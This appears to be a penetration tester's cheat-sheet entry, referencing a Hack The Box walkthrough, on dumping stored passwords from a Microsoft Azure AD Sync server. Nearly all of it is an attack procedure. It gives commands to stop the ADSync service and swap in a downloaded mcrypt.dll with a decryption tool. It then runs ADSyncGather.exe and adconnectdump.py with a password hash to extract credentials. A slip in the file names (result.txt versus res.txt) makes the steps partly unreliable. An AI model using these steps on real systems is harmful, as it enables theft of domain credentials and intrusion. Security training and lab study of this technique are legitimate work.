# AD Sync

Dumping Password from AD Sync, Need admin privilege on sync machine.

## Check

+ Admin privilege.
+ Folder exist on `C:\Program Files\Microsoft Azure AD Sync`
+ Check service : `Get-CimInstance -ClassName Win32_Service -Filter "Name = 'ADSync'" | Select-Object Name, StartMode, State` 

## Exploit

1. Download the prebuild binary on [here](https://github.com/VbScrub/AdSyncDecrypt/releases), unzip get `AdDecrypt.exe` and `mcrypt.dll`.
2. Stop service : `stop-service ADSync`.
3. Upload those two file on `C:\Program Files\Microsoft Azure AD Sync\bin`, dont forgot to backup `mcrypt.dll`.
4. Start service : `start-service ADSync`.
5. Run `ADSyncGather.exe`, build from [here](https://github.com/dirkjanm/adconnectdump/tree/master), and save output into `result.txt`.
6. Run `python3 adconnectdump.py SRV001/administrator@srv001.manesec.com -hashes :xxxxxxxxxxxxxxxxx --from-file res.txt`


# Reference

+ https://offs3cg33k.medium.com/monteverde-htb-walkthrough-d6e4324da7e0